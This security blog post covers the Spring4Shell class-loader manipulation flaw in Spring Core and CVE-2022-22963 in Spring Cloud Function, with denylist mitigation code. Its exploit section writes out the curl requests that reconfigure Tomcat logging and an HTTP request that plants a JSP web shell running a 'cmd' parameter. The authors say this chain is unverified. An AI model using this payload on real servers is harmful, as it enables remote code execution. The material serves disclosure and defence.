On March 29th, 2022, two RCE vulnerabilities were being discussed on the internet. Most of the people talking about them
believe they're talking about "Spring4Shell", but in reality they're swapping notes about [CVE-2022-22963](https://tanzu.vmware.com/security/cve-2022-22963).

### TL;DR

Two RCEs exist. Three vectors are being discussed (one is not known to be remotely exploitable).

1. Confirmed: "Spring4Shell" in Spring Core that has been confirmed by several sources that leverages class injection (very severe),
2. Confirmed: [CVE-2022-22963](https://tanzu.vmware.com/security/cve-2022-22963) in Spring Cloud Function (less severe),
3. Unconfirmed: A third weakness that was initially discussed as allowing RCE via Deserialization, but isn't exploitable (not severe currently).

## RCE in "Spring Core"

We believe that users running JDK version 9 and newer are vulnerable to an RCE attack. All versions of Spring Core are
impacted (no patch has been released yet).

There are strategies to mitigate the attack (see below), and we believe that are also mitigating factors in terms of
an individual app's ability to be exploited. However, because of the lack of details currently, we currently recommend
that all users apply mitigations if they are running Spring Core.

[More details on applying mitigations.](#applying-mitigations)

## RCE in "Spring Cloud Function"

If you're using the Spring Cloud Function library, you must upgrade to 3.1.7+ or 3.2.3+ to prevent an RCE attack.

[More details on CVE-2022-22963](#cve-2022-22963)

## Overview of Vulnerabilities

- [Spring4Shell](#spring4shell): An _confirmed RCE_ in *Spring Core* <=5.3.17. We're investigating this currently.
- [CVE-2022-22963](#cve-2022-22963): A _confirmed RCE_ in *Spring Cloud Function* (<=3.1.6 and <=3.2.2).
- An unconfirmed deserialization weakness in Spring Core that could lead to an RCE. (Spring Core <=5.3.17)

## Spring4Shell

On March 29th, 2022, a set of Tweets (now deleted) were published from a Chinese Twitter account showing screenshots of a
new POC 0-day exploit in the popular Java library *Spring Core*. ~~These reports are still unconfirmed, and we are actively
investigating the exploitability of this potential vulnerability.~~
_[Praetorian has confirmed that this is exploitable](https://www.praetorian.com/blog/spring-core-jdk9-rce/), but we still
don't have all the details around how widespread or exploitable this is._

There is not currently a CVE associated with this
vulnerability, but it has been being referred to as "Spring4Shell" by users on Twitter.

### Applying Mitigations

If you're using Spring Core, this is currently the only known remediation for patching this attack. There is no patch
available (as of 3-30-2022 @ 2:30pm).

According to the [Praetorian post](https://www.praetorian.com/blog/spring-core-jdk9-rce/) confirming the presence of an
RCE in Spring Core, the currently recommended approach for is to patch `DataBinder` by adding a blacklist of vulnerable
field patterns required for exploitation.

_Review [our section](#exploit-scenario-overview) on how exploitation works and why these mitigations patch the
"Class Loader Manipulation" attack vector used by the RCE._

:::note
Getting Spring to load `BinderControllerAdvice` may require manual steps to have it load. We'll update this guide with
more details about how to do that soon.
:::

```java
import org.springframework.core.Ordered;
import org.springframework.core.annotation.Order;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.bind.annotation.InitBinder;

@ControllerAdvice
@Order(10000)
public class BinderControllerAdvice {
    @InitBinder
    public void setAllowedFields(WebDataBinder dataBinder) {
        // This code protects Spring Core from a "Remote Code Execution" attack (dubbed "Spring4Shell").
        // By applying this mitigation, you prevent the "Class Loader Manipulation" attack vector from firing.
        // For more details, see this post: https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/
        String[] denylist = new String[]{"class.*", "Class.*", "*.class.*", "*.Class.*"};
        dataBinder.setDisallowedFields(denylist);
    }
}
```

Alternatively, you can inject the mitigations by adding a method to a controller:

```java
import com.pinger.fun.model.EvalBean;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.propertyeditors.StringTrimmerEditor;
import org.springframework.ui.Model;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.annotation.InitBinder;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;

@RestController
public class IndexController {
    @RequestMapping("/index")
    public void index(EvalBean evalBean){
        System.out.println("Hello world!");
    }

    // You only need to add this method in one of your controllers in order to prevent exploitation.
    @InitBinder
    public void initBinder(WebDataBinder binder) {
        // This code protects Spring Core from a "Remote Code Execution" attack (dubbed "Spring4Shell").
        // By applying this mitigation, you prevent the "Class Loader Manipulation" attack vector from firing.
        // For more details, see this post: https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/
        String[] blackList = {"class.*","Class.*","*.class.*",".*Class.*"};
        binder.setDisallowedFields(blackList);
    }
}

```

### Our Analysis

The speculation around this RCE was initially that this was related to a
[change that was made to Spring Core](https://github.com/spring-projects/spring-framework/commit/7f7fb58dd0dae86d22268a4b59ac7c72a6c22529)
the deprecates an old "exception cloning" function that uses Java serialization and deserialization. This is problematic
because deserialization with untrusted string values, in Java, _does_ allow an attacker to gain RCE.

~~However, in this case, there are mitigating factors because of where this function is exposed. By default, it's only
exposed in the `@CacheResult` annotation ([code](https://github.com/spring-projects/spring-framework/blob/02d3e00d33a578fb776cc2c65a9c15d9a75b2072/spring-context-support/src/main/java/org/springframework/cache/jcache/interceptor/CacheResultInterceptor.java#L125))
which requires an exception to be thrown and _then_ cached. Even if this vulnerability is exploitable, it will not be as
easily exploitable as [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day) was.~~ _This was not the attack vector originally hypothesized._

:::info
**Update:** The originally hypothesized
"[Deserialization Injection](https://owasp.org/www-pdf-archive/GOD16-Deserialization.pdf)" vector was not the attack
vector used by the original deleted Twitter screenshots. People have confirmed that the issue is due to a weakness that
enables a "Class Loader Manipulation" attack when `@RequestMapping` is used to parse a request.
:::

### Exploit Scenario Overview

Consider the below code:

```java
public class Spring4ShellRequest {
    public String name;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
}

@RestController
public class MainController {
    @RequestMapping(value = "/spring4shell")
    public void index(Spring4ShellRequest request){
        System.out.println(request);
    }
}
```

Executing the request:
```shell
curl 'http://localhost:8080/spring4shell?name=test'
```

Will attempt to parse the query parameters `name=test` into the Plain Old Java Object (POJO) `request` which is of type `Spring4ShellRequest`.
With this normal request, Spring's `RequestMapping` will use the setter for `name` to set the POJO's name field to `"test"`.

The vulnerability exists due to other values that can be set.

[![Spring4Shell Exploitation](https://www.lunasec.io/docs/img/Cheese_Wed-30Mar22_14.30.png)](https://www.lunasec.io/docs/img/Cheese_Wed-30Mar22_14.30.png)

Exploring the values that can be set using query parameters, we see that `class` is accessible. We can traverse the properties of `class` with our query parameter
and locate a field that we can both write to and has meaning to the execution of the program:

```shell
curl 'http://localhost:8080/spring4shell?class.module.classLoader.resources.context.parent.pipeline.first.pattern=test'
```

Subsequent requests can be issued which set the following Tomcat logging properties:
```shell
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%74%65%73%74%7d%69
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=%2f%74%6d%70
class.module.classLoader.resources.context.parent.pipeline.first.prefix=jsp
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

Issuing a final request will use the values that have been set to exploit the vulnerability
```
GET /stupidRumor_war_exploded/any/path?cmd=touch /tmp/test HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
test: `<%Runtime.getRuntime().exec(request.getParameter("cmd"))%>`
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

A file will be written to: `/tmp/test.jsp` and it will contain the contents: `<%Runtime.getRuntime().exec(request.getParameter("cmd"))%>`. This file will be used for format the logs for the server and an arbituary command can be passed in using the query parameter `query`.

:::info Exploit Verification
We have not successfully verified, for ourselves, that this exploit works. To the best of our knowledge, and based on the reports from trusted
sources, that this is the vector of exploitation for this vulnerability for Spring4Shell. Future updates to this section will contain
code that has been verified, by us, to exploit this vulnerability.

### Test the Exploit yourself

We've gone ahead and written an ["Example Vulnerable Application" on GitHub](https://github.com/lunasec-io/spring-rce-vulnerable-app)
for this vulnerable deserialization RCE attack. That repo does not currently contain a working POC or any information
about _how to exploit this_, but it does provide a way to help reduce the uncertainty around this by testing payloads
that could work.

## CVE-2022-22963

To add even further confusion to the "hype" around this, there _is_ a
[confirmed CVE](https://spring.io/blog/2022/03/29/cve-report-published-for-spring-cloud-function) in Spring that was published on
March 29th, 2022 _also_! That CVE is being tracked as
[CVE-2022-22963](https://tanzu.vmware.com/security/cve-2022-22963), and it affects the *Spring Cloud Function* library
_only_ which is a separate Java library from *Spring Core*. This vulnerability currently has a *CVSS score of 5.7* and
has known POCs available on [Twitter](https://twitter.com/bytehx343/status/1509034539330732033) and
[GitHub](https://github.com/dinosn/CVE-2022-22963) ([another](https://github.com/RanDengShiFu/CVE-2022-22963)).

### Our Analysis

This vulnerability is real. If you're using the Spring Cloud Function library, you should upgrade to 3.1.7+ or 3.2.3+ to
mitigate this RCE.

There are likely mitigating factors that you can use to determine if you are vulnerable or not based
on your usage, but we're not currently publishing details about that in this post. (We're trying to help reduce the
uncertainty around Spring4Shell currently.)

## The Current Situation

The situation is confusing because the vulnerabilities are in two popular Java libraries that are both published by Spring
(Spring Core and Spring Cloud Function). Further, this situation is made worse by the lack of a CVE to differentiate them.
Anybody searching for "Spring RCE" online is going to find the RCE results for the less popular Spring Cloud Function
library.

They won't be able to find information validating Spring4Shell because it's still a _vulnerability without a CVE_. There
is no CVE to track it and multiple issues have been described as "Spring4Shell". It's all speculation and screenshots on Twitter/GitHub.

Even the name "Spring4Shell" was only picked because Spring Core is as ubiquitous of a library similar to how
log4j was (which spawned the infamous [Log4Shell vulnerability](https://www.wired.com/story/log4j-flaw-hacking-internet/)).

What is important to remember is that this vulnerability is *NOT* as bad a Log4Shell. All attack scenario are more
complex and have more mitigating factors than Log4Shell did because of the nature of
how ~~deserialization exploits~~ _Class Loader Manipulation_ attacks work in Java.

With Log4Shell, exploitation was trivial and an exploit could be written in seconds that worked on most apps.

With Spring4Shell, exploitation requires deep Java knowledge to get a functioning POC. ~~It also requires certain features,
such as caching, to be enabled in Spring before an app is vulnerable.~~ _Class Loader Manipulation is more complicated to
understand than Log4Shell initially required. We don't have all the details yet though._

Why listen to us?

With chaos everywhere, it can be hard to know who to trust. So why this post versus any other?

Well, we're all Security Engineers with experience dealing with chaos. In addition to writing a
[mitigation guide for Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide), we've also been
validating bug reports professionally for years. We helped run the Bug Bounties at
Uber and Snapchat, both of which had significantly more "invalid" reports submitted than "real" ones. Because of that, we've
gotten very good at verifying that an exploit is a problem _before_ we ever sound the alarm.

Because of that, we're committed to only publishing the facts and our thoughts _after_ we've had time to understand them.

## Context to Tame the Chaos

Trying to understand what information is "real" and what mitigations actually work is very difficult for vulnerabilities
without a CVE. That's especially true when the
[Spring developers themselves](https://twitter.com/hacksilon/status/1509117953064812547) are denying that there is a problem.

### Deserialization alone is not a CVE

Why not declare this a problem immediately and add to the panic?

When we initially wrote this post, the level of uncertainty was _much higher_ than it is now. And, by itself, Code
Execution isn't terribly concerning. JavaScript still has the `eval` function included in every Node.js server or
browser, but it's not considered to be a security vulnerability until an attacker has a way to feeding string input into
`eval` with content they control.

In order to achieve that, for most applications, an attacker would have to be able to modify the application's source
code directly in order to give themselves access to execute `eval`. And, at that point, they wouldn't need `eval` anymore
because they can just put in their own code anyway!

That's what why security experts call them "Remote Code Execution" (RCE) attacks. We're only ever concerned when an
unauthorized user is able to *Remotely* execute code. That's what made Log4Shell
such a bad RCE vulnerability because developers log user-controlled variables (like usernames) all the time!

### Deja-vu

There are a lot of similarities between Spring4Shell and Log4Shell besides their names. Back in December we were the first team to write
about the (at the time speculated) [Java RCE vulnerability in log4j](https://www.lunasec.io/docs/blog/log4j-zero-day) floating around
on Twitter.

We initially named that vulnerability "Log4Shell" because, at the time, because
[CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) hadn't been published nor had the Apache team
published about any security notices about the issue.

And, just like then, misinformation was able to spread quickly and easily. It's much easier to photoshop a
screenshot showing an exploit and "redact the details" than it is to investigate a security vulnerability in a large
code base like Spring Core. It's also easy to tell people how to "fix" the vulnerability without any proof that the
mitigations are effective. (Which is why a [2nd CVE was published in log4j](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/).)

Users on Twitter have been calling this possible RCE "Spring4Shell" to differentiate the RCE vulnerabilities. We're
doubling down on that term, in lieu of a proper CVE, to help users search for it separately from the other RCE mentioned
in this post.

Fortunately, this isn't the first "incident" we've responded to, and we're happy to help tame the chaos. See our list of
kudos at the bottom of this post to see who else helped us write this!
